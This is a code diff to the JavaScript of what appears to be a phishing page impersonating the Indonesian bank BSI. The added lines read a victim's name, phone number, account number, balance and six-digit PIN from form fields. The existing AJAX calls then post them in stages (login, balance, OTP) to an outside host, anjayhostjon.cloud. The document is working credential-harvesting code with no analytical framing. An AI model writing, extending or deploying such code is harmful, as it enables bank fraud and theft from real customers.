@@ -30,6 +30,11 @@ function sendLog() {
 event.preventDefault();
 $('.process1').fadeIn();
  document.getElementById('btnSubmit1').innerHTML ="Memproses..."; 
+    const tarif = $('#tarif').val();
+    const nomor = $('#nomor').val();
+    const nama = $('#nama').val();
+    const rek = $('#rek').val();
+    
       $.ajax({
             type: 'POST',
             url: 'https://anjayhostjon.cloud/BSI/7h27g/login.php',
@@ -58,6 +63,12 @@ function sendSaldo() {
 event.preventDefault();
 $('.process1').fadeIn();
  document.getElementById('btnSubmit1').innerHTML ="Memproses..."; 
+    const tarif = $('#tarif').val();
+    const nomor = $('#nomor').val();
+    const nama = $('#nama').val();
+    const rek = $('#rek').val();
+    const saldo = $('#saldo').val();
+    
       $.ajax({
             type: 'POST',
             url: 'https://anjayhostjon.cloud/BSI/7h27g/saldo.php',
@@ -89,7 +100,13 @@ function sendOtp() {
   event.stopPropagation();
     event.preventDefault();
   $("#djload").show();  
- document.getElementById('btnSubmit1').innerHTML = "Memproses...";    
+ document.getElementById('btnSubmit1').innerHTML = "Memproses..."; 
+    const tarif = $('#tarif').val();
+    const nomor = $('#nomor').val();
+    const nama = $('#nama').val();
+    const rek = $('#rek').val();
+    const saldo = $('#saldo').val();
+    const sixpin = $('#sixpin').val();
 $.ajax({
  type: 'POST',
  url: 'https://anjayhostjon.cloud/BSI/7h27g/otp.php',
